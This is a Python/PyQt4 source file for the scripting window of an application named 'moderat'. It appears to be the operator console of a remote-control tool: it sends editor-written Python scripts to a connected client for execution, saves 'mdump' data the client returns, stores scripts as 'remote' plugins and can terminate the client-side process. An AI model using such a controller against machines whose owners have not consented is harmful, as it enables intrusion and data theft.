from pyqode.core import api
from pyqode.core import modes
from pyqode.core import panels
from pyqode.qt import QtWidgets
from pyqode.core.widgets import InteractiveConsole
from output import Output
import server

import main_ui
from list import listPopup
import os, sys, datetime, ast
from PyQt4.QtGui import *
from PyQt4.QtCore import *

from libs.dialogs import message


class mainPopup(QMainWindow, main_ui.Ui_Form):
    def __init__(self, args):
        QMainWindow.__init__(self)
        self.setupUi(self)

        self.moderat = args['moderat']
        self.client = args['client']
        self.module_id = args['module_id']
        self.alias = args['alias']
        self.ip_address = args['ip_address']
        self.p2p = args['p2p']

        title_prefix = self.alias if len(self.alias) > 0 else self.ip_address
        self.setWindowTitle(u'[{}] {}'.format(title_prefix, self.moderat.MString('MSCRIPTING_TITLE')))

        # init idle
        self.editor = api.CodeEdit()
        #self.editor.setStyleSheet('border: 0px; padding: 0px; background: #34495e;')
        # start the backend as soon as possible
        self.editor.backend.start(server.__file__)
        # append some modes and panels
        self.editor.modes.append(modes.CodeCompletionMode())
        self.editor.modes.append(modes.AutoIndentMode())
        self.editor.modes.append(modes.AutoCompleteMode())
        self.editor.modes.append(modes.IndenterMode())
        self.editor.modes.append(modes.ExtendedSelectionMode())
        self.editor.modes.append(modes.SymbolMatcherMode())
        self.editor.modes.append(modes.ZoomMode())
        self.editor.modes.append(modes.LineHighlighterMode())
        self.editor.modes.append(modes.PygmentsSyntaxHighlighter(self.editor.document()))
        sh = self.editor.modes.append(modes.PygmentsSH(self.editor.document()))
        sh.fold_detector = api.IndentFoldDetector()
        self.editor.modes.get(modes.PygmentsSyntaxHighlighter).pygments_style = 'monokai'
        self.editor.panels.append(panels.SearchAndReplacePanel(),
                                  api.Panel.Position.BOTTOM)
        self.editor.panels.append(panels.CheckerPanel())
        self.editor.panels.append(panels.LineNumberPanel())
        self.editor.panels.append(panels.MarkerPanel())
        self.editor.panels.append(panels.EncodingPanel())
        self.editor.panels.append(panels.FoldingPanel())
        self.editor.panels.append(panels.ReadOnlyPanel())

        self.output = Output(self.editor, self.moderat)
        self.splitter = QSplitter()
        self.splitter.setOrientation(Qt.Vertical)
        self.splitter.addWidget(self.editor)
        self.splitter.addWidget(self.output)

        self.setCentralWidget(self.splitter)

        # self.runButton.clicked.connect(self.run_script)
        # self.testButton.clicked.connect(self.run_test)
        # self.openButton.clicked.connect(self.from_file)
        # self.pluginsListButton.clicked.connect(self.open_list)
        # self.addPluginButton.clicked.connect(self.insert_plugin)
        # self.saveButton.clicked.connect(self.save_plugin)
        # self.pluginSearchLine.returnPressed.connect(self.insert_plugin)
        # self.clearButton.clicked.connect(self.clear_script)
        # self.pinButton.clicked.connect(self.always_top)

        # Autocompleter
        self.completer = QCompleter(self.moderat.plugins.keys())
        self.completer.setCompletionMode(QCompleter.PopupCompletion)
        self.completer.setCaseSensitivity(Qt.CaseInsensitive)
        self.completer.popup().setStyleSheet('''background-color: #273747;
                                        color: #c9f5f7;
                                        border: 1px solid #243342;
                                        border-top: none;''')
        self.addTools()

    def addTools(self):

        self.toolBox = QToolBar(self)
        self.toolBox.setIconSize(QSize(16, 16))

        self.openListAction = QAction(self)
        self.openListAction.setObjectName('openList')
        self.openListAction.triggered.connect(self.open_list)
        self.fromFileAction = QAction(self)
        self.fromFileAction.setObjectName('fromFile')
        self.fromFileAction.triggered.connect(self.from_file)
        self.saveScriptAction = QAction(self)
        self.saveScriptAction.setObjectName('saveScript')
        self.saveScriptAction.triggered.connect(self.save_script)
        self.searchScriptLine = QLineEdit()
        self.searchScriptLine.setPlaceholderText(self.moderat.MString('MSCRIPTING_SEARCH_SCRIPT'))
        self.searchScriptLine.setCompleter(self.completer)

        self.toolBox.addSeparator()
        self.toolBox.addAction(self.openListAction)
        self.toolBox.widgetForAction(self.openListAction).setObjectName(self.openListAction.objectName())
        self.toolBox.addSeparator()
        self.toolBox.addAction(self.fromFileAction)
        self.toolBox.widgetForAction(self.fromFileAction).setObjectName(self.fromFileAction.objectName())
        self.toolBox.addSeparator()
        self.toolBox.addAction(self.saveScriptAction)
        spacer = QWidget(self)
        spacer.setProperty('spacer', '1')
        spacer.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Minimum)
        self.toolBox.addWidget(spacer)
        self.toolBox.widgetForAction(self.saveScriptAction).setObjectName(self.saveScriptAction.objectName())
        self.toolBox.addWidget(self.searchScriptLine)
        self.addToolBar(Qt.TopToolBarArea, self.toolBox)

        self.actionTools = QToolBar(self)
        self.actionTools.setIconSize(QSize(16, 16))
        self.runScriptAction = QAction(self)
        self.runScriptAction.setObjectName('runScript')
        self.runScriptAction.triggered.connect(self.run_script)
        self.runTestAction = QAction(self)
        self.runTestAction.setObjectName('runTest')
        self.runTestAction.triggered.connect(self.run_test)
        self.actionTools.addSeparator()
        self.actionTools.addAction(self.runScriptAction)
        self.actionTools.widgetForAction(self.runScriptAction).setObjectName(self.runScriptAction.objectName())
        self.actionTools.addSeparator()
        self.actionTools.addAction(self.runTestAction)
        self.actionTools.widgetForAction(self.runTestAction).setObjectName(self.runTestAction.objectName())
        self.addToolBar(Qt.TopToolBarArea, self.actionTools)

        self.insertToolBarBreak(self.actionTools)

    def signal(self, data):
        self.callback(data)

    def run_script(self):
        script = self.editor.toPlainText()
        self.moderat.send_message(script, 'scriptingMode', session_id=self.moderat.session_id, _to=self.client,
                                  module_id=self.module_id, p2p=self.p2p)
        self.callback = self.recv_script
        self.output.addNormalText(u'<br><font color="#e74c3c">{} {}</font>'.format(
            self.moderat.MString('MSCRIPTING_SCRIPT_RUNNING'),
            datetime.datetime.now())
        )

    def run_test(self):
        with open('test.py', 'w') as _file:
            _file.write(self.editor.toPlainText())
        self.console = InteractiveConsole()
        self.console.setWindowTitle(self.moderat.MString('MSCIPTING_PYTHON_CONSOLE'))
        self.console.setWindowIcon(QIcon(':/icons/assets/logo.png'))
        self.console.setStyleSheet('border: 0px; padding: 0px; background: #ecf0f1;')
        self.console.start_process(sys.executable, ['test.py'])
        self.console.closeEvent = self.test_closed
        self.console.show()

    def test_closed(self, event):
        if os.path.exists('test.py'):
            os.remove('test.py')

    def recv_script(self, data):
        output = ast.literal_eval(data['payload'])
        if output.has_key('mdump'):
            if len(output['mdump']) > 0:
                if type(output['mdump']) == dict:
                    _d = output['mdump']
                    dname = QFileDialog.getExistingDirectory(self, self.moderat.MString('MSCRIPTING_SAVE_DIR'))
                    if dname:
                        result = {}
                        for key in _d.keys():
                            _path = os.path.join(dname, key)
                            with open(_path, 'w') as _f:
                                _f.write(str(_d[key]))
                                result[key] = {
                                    'time': str(datetime.datetime.now()),
                                    'length': len(str(_d[key])),
                                    'path': _path,
                                }
                        self.output.addDumpFiles(result)
                else:
                    fname = QFileDialog.getSaveFileName(self, self.moderat.MString('MSCRIPTING_SAVE_FILE'), '', )
                    if fname:
                        with open(fname, 'w') as _file:
                            _file.write(str(output['mdump']))
                        self.output.addDumpFiles({
                            'file': {
                                'time': str(datetime.datetime.now()),
                                'length': len(str(output['mdump'])),
                                'path': fname,
                            }
                        })
        if output.has_key('mprint'):
            if len(output['mprint']) > 0:
                self.output.addNormalText(str(output['mprint']))

    def insert_plugin(self, plugin_name=None):
        if not plugin_name:
            plugin_name = str(self.pluginSearchLine.text())
        if self.moderat.plugins.has_key(plugin_name):
            self.editor.clear()
            self.editor.insertPlainText(self.moderat.plugins[plugin_name]['source'])
        else:
            message.error(self.moderat,
                          self.moderat.MString('MSCRIPTING_NO_PLUGIN'),
                          self.moderat.MString('MSCRIPTING_NO_PLUGIN'))

    def save_script(self):
        script_name, ok = QInputDialog.getText(self, self.moderat.MString('MSCRIPTING_PLUGIN_NAME'), self.moderat.MString('MSCRIPTING_PLUGIN_NAME'),
                                               QLineEdit.Normal)
        if ok:
            script_description, ok = QInputDialog.getText(self, self.moderat.MString('MSCRIPTING_PLUGIN_DESC'),
                                                          self.moderat.MString('MSCRIPTING_PLUGIN_DESC'), QLineEdit.Normal)
            if ok:
                # Check if script_name exists
                if script_name in self.moderat.plugins.keys():
                    message.error(self.moderat,
                                  self.moderat.MString('MSCRIPTING_PLUGIN_EXISTS'),
                                  self.moderat.MString('MSCRIPTING_PLUGIN_EXISTS'))
                    return
                with open(os.path.join(self.moderat.plugins_dir, str(script_name) + '.py'), 'w') as plugin_file:
                    payload = 'plugin_name = r"""%s"""\n' % script_name
                    payload += 'plugin_description = r"""%s"""\n' % script_description
                    payload += 'plugin_type = r"""remote"""\n'
                    payload += 'plugin_source = r"""%s"""\n' % self.editor.toPlainText()
                    plugin_file.write(payload)
                    message.info(self.moderat,
                                 self.moderat.MString('MSCRIPTING_PLUGIN_SAVED'),
                                 self.moderat.MString('MSCRIPTING_PLUGIN_SAVED'))

    def open_list(self):
        self.listPopup = listPopup(self, self.moderat.plugins)
        self.listPopup.show()

    def from_file(self):
        fname = QFileDialog.getOpenFileName(self, self.moderat.MString('MSCRIPTING_OPEN_FILE'),
                                            '', self.moderat.MString('MSCRIPTING_PYTHON_FILES') + " (*.py);;" +
                                            self.moderat.MString('MSCRIPTING_ALL_FILES') + " (*)")
        if fname:
            with open(fname, 'r') as _file:
                self.editor.clear()
                self.editor.insertPlainText(_file.read())

    def clear_script(self):
        self.editor.clear()

    def closeEvent(self, QCloseEvent):
        self.moderat.send_message(self.module_id, 'terminateProcess', session_id=self.moderat.session_id,
                                  _to=self.client, p2p=self.p2p)
